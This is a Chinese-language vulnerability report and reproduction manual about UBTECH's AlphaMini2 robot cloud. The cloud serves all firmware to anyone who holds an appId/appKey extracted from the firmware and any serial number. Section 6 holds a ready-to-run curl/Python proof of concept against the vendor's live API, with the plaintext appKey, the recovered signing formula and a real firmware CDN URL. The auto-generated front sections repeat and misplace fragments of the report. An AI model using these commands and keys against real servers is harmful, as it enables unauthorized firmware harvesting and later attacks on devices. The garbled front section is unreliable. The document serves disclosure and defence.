---
编号: UBW-001
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选AI悟空EDU
源候选目录: 云端仅凭SN获取全量固件
---
# UBW-001 UBTECH 悟空2代（AlphaMini2）云端仅凭 SN 获取全量固件 — 分析与复现手册

## 1. 一句话结论

- ## 1. 执行摘要
- **攻击者无需账号、无需拥有设备、无需与设备同网，仅凭固件/App 内公开可提取的一组 appId/appKey 和一个任意 SN 字符串（甚至是不存在的 SN），即可从 UBTECH 云端枚举并下载悟空2代的全部已发布固件**——包括 1.18 GB 完整安卓系统 OTA（含 boot/system/vendor 等 8 分区）、胸部主控 MCU 固件、6 路舵机固件。
- 严重度定级：**高（High）**——固件是攻击面地图：任何人可离线分析最新固件挖掘 Nday、提取内嵌密钥（OTA/IM/MQTT 凭据均随固件公开）、研究 MCU/舵机固件刷写链。与同目录"云端任意机器人未授权控制"组合时，构成"拿到固件→挖洞→批量攻击在线设备"的完整前置条件。
- ## 2. 危害全景
- 头：X-UBT-AppId / X-UBT-DeviceId(任意SN) / X-UBT-Sign / X-UBT-Timestamp / X-UBT-Nonce

## 2. 影响产品与版本

- # UBTECH 悟空2代（AlphaMini2）云端仅凭 SN 获取全量固件 — 分析与复现手册
- > 版本：2026-07-29 · 环境：SRC 授权测试环境 · 实证设备：自有悟空（SN=<其他机器人设备_01>）
- **攻击者无需账号、无需拥有设备、无需与设备同网，仅凭固件/App 内公开可提取的一组 appId/appKey 和一个任意 SN 字符串（甚至是不存在的 SN），即可从 UBTECH 云端枚举并下载悟空2代的全部已发布固件**——包括 1.18 GB 完整安卓系统 OTA（含 boot/system/vendor 等 8 分区）、胸部主控 MCU 固件、6 路舵机固件。
- - **1 组**公开凭据通吃：appId `980020069`（固件 OtaService 内嵌），服务端对 deviceId 只做"签名自洽"校验，**不校验 SN 是否真实存在、是否归属调用方**（实测不存在的 SN `<其他机器人设备_01>` 与真实 SN 返回完全一致）；
- - **8 个固件模块**当前可下载：android 整包 v1.6.0.3（2026-08-24 发布）+ MCU app v1.1.2.9 + 6 个 2kg 舵机固件 v2.25.09.09；
- 严重度定级：**高（High）**——固件是攻击面地图：任何人可离线分析最新固件挖掘 Nday、提取内嵌密钥（OTA/IM/MQTT 凭据均随固件公开）、研究 MCU/舵机固件刷写链。与同目录"云端任意机器人未授权控制"组合时，构成"拿到固件→挖洞→批量攻击在线设备"的完整前置条件。

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- ## 3. 漏洞根因
- \| `mcu-app` \| v1.1.2.9 \| 90,832 B \| 2026-08 \| 胸部主控 MCU 固件（无签名，仅 MD5） \|
- \| 现象 \| 原因与处理 \|

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- > 未对任何第三方设备执行写入/控制操作。本手册仅供防御研究与负责任披露使用。
- 严重度定级：**高（High）**——固件是攻击面地图：任何人可离线分析最新固件挖掘 Nday、提取内嵌密钥（OTA/IM/MQTT 凭据均随固件公开）、研究 MCU/舵机固件刷写链。与同目录"云端任意机器人未授权控制"组合时，构成"拿到固件→挖洞→批量攻击在线设备"的完整前置条件。
- ## 2. 危害全景
- **"凭 SN 拿固件"因此不是单纯的信息泄露，而是把所有依赖"客户端秘密"的防护全部架空**：
- 关联分析（本漏洞的下游危害证明）见 `脱壳分析/OTA/`：

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# UBTECH 悟空2代（AlphaMini2）云端仅凭 SN 获取全量固件 — 分析与复现手册

> 版本：2026-07-29 · 环境：SRC 授权测试环境 · 实证设备：自有悟空（SN=<其他机器人设备_01>）
> **边界声明**：全部查询仅请求升级元数据与 HTTP HEAD 探测；整包下载仅针对自有设备对应产品线。
> 未对任何第三方设备执行写入/控制操作。本手册仅供防御研究与负责任披露使用。

---

## 1. 执行摘要

**攻击者无需账号、无需拥有设备、无需与设备同网，仅凭固件/App 内公开可提取的一组 appId/appKey 和一个任意 SN 字符串（甚至是不存在的 SN），即可从 UBTECH 云端枚举并下载悟空2代的全部已发布固件**——包括 1.18 GB 完整安卓系统 OTA（含 boot/system/vendor 等 8 分区）、胸部主控 MCU 固件、6 路舵机固件。

关键数字：

- **1 组**公开凭据通吃：appId `980020069`（固件 OtaService 内嵌），服务端对 deviceId 只做"签名自洽"校验，**不校验 SN 是否真实存在、是否归属调用方**（实测不存在的 SN `<其他机器人设备_01>` 与真实 SN 返回完全一致）；
- **8 个固件模块**当前可下载：android 整包 v1.6.0.3（2026-08-24 发布）+ MCU app v1.1.2.9 + 6 个 2kg 舵机固件 v2.25.09.09；
- **全部下载 URL 公开无鉴权**：CDN（assets-new.ubtrobot.com）8 个 URL 经 HEAD 实测全部 200，浏览器直接可下；
- **签名算法完全可恢复**：`X-UBT-Sign = MD5(秒级ts + appKey + nonce8 + deviceId) + " ts nonce v2"`，ts 由云端公开接口下发。

严重度定级：**高（High）**——固件是攻击面地图：任何人可离线分析最新固件挖掘 Nday、提取内嵌密钥（OTA/IM/MQTT 凭据均随固件公开）、研究 MCU/舵机固件刷写链。与同目录"云端任意机器人未授权控制"组合时，构成"拿到固件→挖洞→批量攻击在线设备"的完整前置条件。

---

## 2. 危害全景

### 2.1 固件 = 攻击面地图与密钥库

拿到的 android 整包可完整重建系统镜像（我们已验证 8 个分区 SHA-256 与 manifest 一致），其中明文包含：

- OTA 查询凭据（appId `980020069` + appKey，`com.ubtrobot.mini.ota.BuildConfig`）；
- 腾讯云 IM / MQTT 相关 appKey（980020055 / 980020054 体系，MainApp/SpeechService 内嵌）；
- 全部系统应用（MainApp/Master/OtaService/SpeechService 等）的完整代码——本工作区已据此发现
  master 总线零鉴权、静默安装不验签、MCU 固件 MD5-only 刷写、zip-slip 等 Critical 级问题（见 `脱壳分析/OTA/32-36` 报告）。

**"凭 SN 拿固件"因此不是单纯的信息泄露，而是把所有依赖"客户端秘密"的防护全部架空**：
凡是用固件内嵌密钥做的接口鉴权（OTA、robot-login、im/getInfo），对任何攻击者都是敞开的。

### 2.2 MCU / 舵机固件的硬件攻击面

- `app-wk2_mcu_v1.1.2.9_signed.bin`（90 KB，Cortex-M）：经分析**无密码学签名空间**（尾部仅 64B ASCII 版本信息），
  刷写校验仅 MD5——拿到固件格式即可构造可刷入的恶意 MCU 固件；
- 6 个 2kg 舵机固件（各 12 KB）公开可下，舵机总线协议与 IAP 流程可被离线逆向。

### 2.3 规模化与产品线蔓延

- SN 号段连续（`<其他机器人设备_01>` + 8 位数字），但**本漏洞连真实 SN 都不需要**——deviceId 是自由文本；
- 同一签名体系覆盖多条产品线（同目录报告已实证 5 条产品线固件可下）；AlphaMini2 的查询还暴露出
  接口对 productName 不做凭据隔离（用机器人固件凭据可查手机 App 渠道，反之亦然）。

---

## 3. 漏洞根因

```
公开 App/固件
 ① 提取 appId 980020069 + appKey（OtaService BuildConfig 明文常量）
 ② 签名算法逆出：MD5(ts+appKey+nonce+deviceId)（秒级 ts 由 /v1/client-auth-service/api/timestamp 公开下发）
 ③ GET /v1/upgrade-rest/version/upgradable?productName=AlphaMini2&moduleNames=...&versionNames=...
    头：X-UBT-AppId / X-UBT-DeviceId(任意SN) / X-UBT-Sign / X-UBT-Timestamp / X-UBT-Nonce
 ④ 服务端只校验"签名与 appId/deviceId 自洽" → 返回包名/URL/MD5/大小/发布时间
 ⑤ packageUrl 指向公开 CDN → 无鉴权直接下载
```

设计缺陷三点：

1. **客户端密钥当服务端鉴权用**：appKey 随每台设备固件、每个 App 安装包分发，不具备秘密性；
2. **无对象级授权**：deviceId（SN）不参与任何归属/存在性校验，仅作为签名串的一个字段；
3. **CDN 无防盗链/临时签名**：packageUrl 永久有效、公开可下（实测 HEAD 200，无 Cookie/Referer 要求）。

关键证据锚点：

| 环节 | 证据 |
|---|---|
| 内嵌凭据 | 固件内 `com/ubtrobot/mini/ota/BuildConfig.java:24-25`（appId/appKey 明文） |
| 签名算法 | `HttpSignInterceptor.java:64`（v2 签名构造） |
| deviceId 来源 | `OtaService.java:261-263`（`SysApi.readRobotSid()`，服务端无对应校验） |
| 无差别返回 | `evidence/ota_full_enum_20260729.json`：own_sn 与 fake_sn 结果逐字节一致 |
| CDN 公开 | 同文件 `url_head_check`：8/8 URL HEAD 200 |

---

## 4. 当前可下载清单（2026-07-29 实测，productName=AlphaMini2）

| 模块 | 版本 | 大小 | 发布时间 | 说明 |
|---|---|---|---|---|
| `android` | v1.6.0.3 | 1,181,357,667 B (1.1GB) | 2026-08-24 | 完整系统 OTA（8 分区 A/B payload） |
| `mcu-app` | v1.1.2.9 | 90,832 B | 2026-08 | 胸部主控 MCU 固件（无签名，仅 MD5） |
| `1g/2g/3g/4g/11g/12g` | v2.25.09.09 | 12,072 B ×6 | 2025-09 | 2kg 舵机固件 |
| `mcu-boot / firmware / uboot / dtbo / boot / main-service / 5a-10a,13a,14a / 5g-10g,13g,14g` | — | — | — | 云端未发布（返回空） |

注：2026-06 我们下载过前一版 android v1.4.0.5（MD5 `a421645b87613d6d2a21d9fbea4b4e97`，已落盘并完成全量分析）；
本次查询发现云端已更新至 v1.6.0.3，MCU 亦由 v1.1.2.6 更新至 v1.1.2.9——**攻击者可持续跟踪最新固件**。

---

## 5. 复现环境

- 一台能上网的电脑，Python 3（标准库即可，无第三方依赖）；
- 不需要机器人、不需要账号、不需要与任何设备同网。

## 6. 复现步骤

### 6.1 一键枚举（推荐）

```bash
python evidence/ota_firmware_query.py
```

预期输出（实录见 `evidence/ota_full_enum_20260729.json`）：使用**不存在的 SN** `<其他机器人设备_01>`
仍返回 android v1.6.0.3 整包 URL/MD5/大小 + mcu-app v1.1.2.9 等 8 项元数据。

### 6.2 curl 手动验证（签名现场计算）

```bash
TS=$(curl -s https://apis.ubtrobot.com/v1/client-auth-service/api/timestamp | python -c "import sys,json;print(json.load(sys.stdin)['data'])")
NONCE=$(python -c "import uuid;print(uuid.uuid4().hex[:8])")
DEVICE="<其他机器人设备_01>"   # 任意字符串
SIGN=$(python -c "import hashlib;print(hashlib.md5('${TS}3763650528784c14a7723cd81d941ed0${NONCE}${DEVICE}'.encode()).hexdigest()+' ${TS} ${NONCE} v2')")
curl -s -G "https://apis.ubtrobot.com/v1/upgrade-rest/version/upgradable" \
  --data-urlencode "productName=AlphaMini2" \
  --data-urlencode "moduleNames=android,mcu-app" \
  --data-urlencode "versionNames=v1.0.0.760,v0.0.0" \
  -H "X-UBT-AppId: 980020069" -H "X-UBT-DeviceId: ${DEVICE}" \
  -H "X-UBT-Sign: ${SIGN}" -H "X-UBT-Timestamp: ${TS}" -H "X-UBT-Nonce: ${NONCE}"
```

### 6.3 下载公开性验证（不下载整包）

```bash
curl -sI "https://assets-new.ubtrobot.com/upgrade-pro/upgrade/2026/08/1786534203159/WK2-OTA-20260812-V1.6.0.3.zip" | head -3
# 预期：HTTP 200，Content-Length: 1181357667 —— 无任何鉴权
```

### 排错表

| 现象 | 原因与处理 |
|---|---|
| 403 `非法客户端` | ts 用了本地时间而非服务器时间（先取 timestamp 接口）；或签名拼接顺序错（ts+appKey+nonce+deviceId） |
| 返回 `[]` | productName 错误或该模块未发布（属正常，见 §4 清单） |
| nonce 不是 8 位 | 签名串中的 nonce 与 X-UBT-Nonce 必须一致且为 8 位 |

---

## 7. 证据与文件索引

```
云端仅凭SN获取全量固件/
├── README.md                              ← 本手册
└── evidence/
    ├── ota_firmware_query.py              ← 一键枚举 PoC（纯标准库，可复跑）
    └── ota_full_enum_20260729.json        ← 全模块枚举原始数据 + 8 URL HEAD 验证
                                             （own_sn 与 fake_sn 结果一致是核心证据）
```

关联分析（本漏洞的下游危害证明）见 `脱壳分析/OTA/`：
`33_channel_check.md`（渠道核对）、`37_mqtt_idor_remote_rce.md`（同一凭据体系下的 robot-login/IM IDOR）、
`38_final_report.md`（固件分析产出的 7 个 Critical 汇总）。

## 8. 修复建议

1. **废弃客户端内嵌凭据作为接口鉴权**：appKey 轮换并下线旧值；OTA/升级接口改用设备级短期凭据
   （产线烧录密钥挑战应答或 mTLS 设备证书）；
2. **对象级授权**：`version/upgradable` 校验 deviceId 真实存在且与调用凭据绑定；对 productName 做凭据隔离；
3. **CDN 防盗链**：packageUrl 改短期签名 URL（如 10 分钟有效）；
4. **固件最小化秘密**：假设固件必被逆向——其中不得包含任何"能换权限"的长期密钥；
5. **监测**：对同一 appId 的高频/大跨度 SN 枚举行为建立风控告警。

---

*本手册所有结论均可在授权环境复现；对外提交前请确认 evidence 中无自有设备敏感信息残留。*
